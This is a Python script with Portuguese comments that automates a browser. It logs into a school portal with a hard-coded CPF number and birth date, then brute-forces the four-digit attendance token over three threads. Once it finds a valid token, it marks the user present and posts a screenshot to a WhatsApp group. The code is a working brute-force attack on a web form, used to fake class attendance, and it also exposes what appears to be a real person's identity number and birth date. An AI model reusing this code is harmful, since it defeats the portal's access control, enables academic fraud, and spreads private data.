
import time
import random
import threading
import pyautogui
import os
import pyperclip
import io
import win32clipboard
from io import BytesIO  # Importando BytesIO corretamente
from PIL import ImageGrab, Image  # Importando Image e ImageGrab corretamente
import datetime

from win32com.client import Dispatch
from PIL import ImageGrab
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from PIL import ImageGrab

token_encontrado = False
testados = set()
lock = threading.Lock()

def down():
    pyautogui.hotkey('win', 'p')
    pyautogui.press('down')

    time.sleep(0.2)  # Breve pausa para garantir que a tecla foi registrada

def selecionar_tela1():
    """Seleciona a opção 'tela1' no menu de projeção."""
    pyautogui.hotkey('win', 'p')  # Abre o menu de projeção
    time.sleep(1.5)  # Aumenta o tempo para o menu abrir completamente

    # Pressiona 'down' duas vezes para navegar até "tela1"
    down()
    time.sleep(1.5)  # Aumenta o tempo para o menu abrir completamente

    down()
    # Confirma a seleção com 'enter'
    time.sleep(0.2)  # Pequena pausa antes de pressionar enter
    pyautogui.press('enter')

# Executa a função para selecionar "tela1"



def selecionar_extender():
    """Seleciona a opção 'tela1' no menu de projeção."""
    pyautogui.hotkey('win', 'p')  # Abre o menu de projeção
    time.sleep(1.5)  # Aumenta o tempo para o menu abrir completamente

    # Pressiona 'down' duas vezes para navegar até "tela1"
    down()
    time.sleep(1.5)  # Aumenta o tempo para o menu abrir completamente

    # Confirma a seleção com 'enter'
    time.sleep(0.2)  # Pequena pausa antes de pressionar enter
    pyautogui.press('enter')



def dar_zoom_na_tela(niveis=1):

    print("Aplicando zoom na tela...")
    
    # Mantém a tecla Ctrl pressionada e faz o zoom "niveis" vezes
    for _ in range(niveis):
        pyautogui.hotkey('ctrl', '+')
        time.sleep(1)  # Pausa para garantir que o zoom é aplicado

    print(f"Zoom aplicado {niveis} vezes.")

def rolar_para_baixo(quantidade=200):
    """
    Rola a tela para baixo usando o scroll do mouse.

    :param quantidade: Quantidade de pixels a rolar para baixo.
    """
    print(f"Rolando a tela para baixo por {quantidade} pixels...")
    pyautogui.scroll(-quantidade)  # Rola para baixo
    print(f"Rolagem para baixo de {quantidade} pixels concluída.")

# Função para posicionar as 3 janelas lado a lado com largura mínima
def posicionar_janelas(driver, index):
    screen_width = 1920  # Largura da tela
    screen_height = 1080  # Altura da tela
    window_width = 500  # Largura mínima de cada janela

    # Posiciona as janelas lado a lado
    position_x = index * window_width  # Posições: 0, 1, 2 (lado a lado)
    driver.set_window_size(window_width, screen_height)  # Define o tamanho da janela
    driver.set_window_position(position_x, 0)  # Posiciona a janela na tela


def capturar_tela():
    # Clica no botão PrtSc para abrir a ferramenta de captura de tela
    print("Capturando tela...")
    pyautogui.press('prtsc')  
    time.sleep(3)
    


    
# Função para abrir o WhatsApp
def abrir_whatsapp():
    caminho_whatsapp = r"C:\Users\vitor\OneDrive\Área de Trabalho\WhatsApp.lnk"
    print("Abrindo WhatsApp Desktop...")
    os.startfile(caminho_whatsapp)
    time.sleep(3)

# Função para localizar grupo no WhatsApp
def localizar_grupo(grupo_nome):
    print(f"Procurando o grupo '{grupo_nome}'...")
    pyautogui.hotkey('ctrl', 'f')
    time.sleep(1)
    pyautogui.hotkey('ctrl', 'a')
    time.sleep(1)
    pyautogui.press('delete')  # Deleta um caractere
    time.sleep(1)  # Espera 1 segundo após a ação de delete
    pyautogui.write(grupo_nome)
    time.sleep(2)
    pyautogui.press('tab')
    time.sleep(2)
    pyautogui.press('enter')
    time.sleep(2)

# Função para enviar imagem no WhatsApp
def enviar_imagem():
    dia_atual = datetime.datetime.now().strftime("%d/%m/%Y")  # Exemplo: 07/11/2024

    print("Enviando a captura de tela...")
    pyautogui.hotkey('ctrl', 'v')
    time.sleep(2)
    mensagem = f"Aula compartilhada - {dia_atual}"

    for linha in mensagem.split('\n'):
        pyautogui.write(linha)
        pyautogui.hotkey('shift', 'enter')
    time.sleep(2)
    pyautogui.press('enter')
    print("Imagem enviada com sucesso!")

# Função para verificar o token
def verificar_token(cpf, data_nascimento, index):
    global token_encontrado

    # Caminho do executável do Chrome
    chrome_driver_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"  # Caminho do Chrome

    # Configura as opções do Chrome
    options = Options()
    options.binary_location = chrome_driver_path

    # Cria o driver com as opções especificadas
    driver = webdriver.Chrome(options=options)

    # Posiciona a janela antes de carregar a página
    posicionar_janelas(driver, index)

    try:
        # Login
        driver.get("https://www.infinityschool.app/area/")
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, "projectFilePath")))

        campo_cpf = driver.find_element(By.NAME, "projectFilePath")
        campo_cpf.send_keys(cpf)

        campo_nascimento = driver.find_element(By.ID, "data_nascimento")
        campo_nascimento.send_keys(data_nascimento)

        botao_acessar = driver.find_element(By.XPATH, "//button[contains(text(),'Acessar')]")
        botao_acessar.click()
        WebDriverWait(driver, 5).until(EC.url_to_be("https://www.infinityschool.app/handle_data"))
        print("Login bem-sucedido!")

        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)

        WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Marcar presença')]"))).click()
        WebDriverWait(driver, 5).until(EC.url_to_be("https://www.infinityschool.app/marcar_presenca"))
        print("Clicando no botao de marcar presença")

        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)

        WebDriverWait(driver, 5).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Presença aula compartilhada')]"))).click()
        WebDriverWait(driver, 5).until(EC.url_to_be("https://www.infinityschool.app/marcar_presenca_work"))
        print("Acesso à página de presença aula compartilhada bem-sucedido!")

        driver.execute_script("window.scrollBy(0, 200);")
        time.sleep(2)

        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "token")))

        while not token_encontrado:
            token = f"{random.randint(0, 9999):04d}"

            with lock:
                if token in testados:
                    continue
                testados.add(token)

            campo_token = driver.find_element(By.ID, "token")
            campo_token.clear()
            campo_token.send_keys(token)
            campo_token.send_keys(Keys.RETURN)

            time.sleep(0.0001)

            try:
                mensagem = driver.find_element(By.ID, "validation-message").text
                if "token válido!" in mensagem.lower():
                    print(f"Token Válido: {token}")
                    token_encontrado = True
                    time.sleep(3)
                    driver.maximize_window()
                    time.sleep(3)

                    botao_concluir = driver.find_element(By.ID, "submit-button")
                    botao_concluir.click()
                    print("Presença geral concluída!")
                    time.sleep(2)
                    rolar_para_baixo(200)  # Rola para baixo por 800 pixels
                    time.sleep(2)

                    dar_zoom_na_tela(3) 
                    time.sleep(3)

                    pyautogui.click()
                    time.sleep(3)


                    # Funções para capturar tela, abrir WhatsApp, localizar grupo e enviar imagem
                    capturar_tela()
                    time.sleep(3)
                    abrir_whatsapp()
                    time.sleep(3)
                    localizar_grupo("Aulas infinity")
                    time.sleep(2)
                    enviar_imagem()
                    time.sleep(2)
                    selecionar_extender()
                    driver.quit()
                    return
            except Exception as e:
                print(f"Erro: {str(e)}")

    finally:
        if not token_encontrado:
            driver.quit()
            print("Não achou token")

# Criando as threads
threads = []
selecionar_tela1()
time.sleep(2)# Criando 3 threads para abrir as janelas (ajuste o número aqui)
pyautogui.click()
time.sleep(2)# Criando 3 threads para abrir as janelas (ajuste o número aqui)

print("A opção 'tela1' foi selecionada.")
time.sleep(3)# Criando 3 threads para abrir as janelas (ajuste o número aqui)
for index in range(3):
    thread = threading.Thread(target=verificar_token, args=(12055250680, 21102004, index))
    threads.append(thread)
    thread.start()

# Espera as threads terminarem
for thread in threads:
    thread.join()


